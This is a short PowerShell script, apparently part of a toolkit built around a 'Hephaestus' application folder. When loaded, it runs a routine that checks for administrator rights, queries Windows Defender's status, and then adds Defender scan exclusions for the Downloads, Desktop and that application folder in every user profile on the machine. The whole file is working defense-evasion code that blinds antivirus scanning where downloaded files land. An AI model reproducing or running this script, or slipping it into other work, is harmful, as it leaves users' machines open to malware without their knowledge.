. ./utils.ps1
. ./consts_body.ps1

function Get-DownloadsFolder {
    [Environment]::GetFolderPath("UserProfile") + "\Downloads"
}

function Get-DesktopFolder {
    [Environment]::GetFolderPath("Desktop")
}

function Add-MsDefenderExclusion {
    param (
        [Parameter(Mandatory=$true)]
        [string]$Folder
    )

    if (-Not (Test-Path -Path $Folder)) {
        Write-Warning "The folder '$Folder' does not exist."
        return
    }

    try {
        Add-MpPreference -ExclusionPath $Folder
    }
    catch {
        Write-Error "Failed to add exclusion: $_"
    }
}

function do_autostuff() 
{
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    writedbg "Running as Administrator: $isAdmin"

    # Check Defender status
    $status = Get-MpComputerStatus
    $status | Select-Object AMServiceEnabled, RealTimeProtectionEnabled, AntivirusEnabled
    writedbg $status

    $subFolders = @("AppData\Roaming\$(Get-HephaestusDirName)", "Downloads", "Desktop")

    $userProfileRoot = "C:\Users"

    $folders = @()

    $folders += Get-DownloadsFolder
    $folders += Get-DesktopFolder
    $folders += Get-HephaestusFolder

    Get-ChildItem -Path $userProfileRoot -Directory | ForEach-Object {
        $userFolder = $_.FullName

        foreach ($sub in $subFolders) {
            $fullPath = Join-Path $userFolder $sub
            if (Test-Path $fullPath) {
                if ($fullPath -notin $folders)
                {
                    $folders += $fullPath
                }
            }
        }
    }

    foreach ($folder in $folders)
    {
        writedbg $folder
        Add-MsDefenderExclusion $folder
    }
}

do_autostuff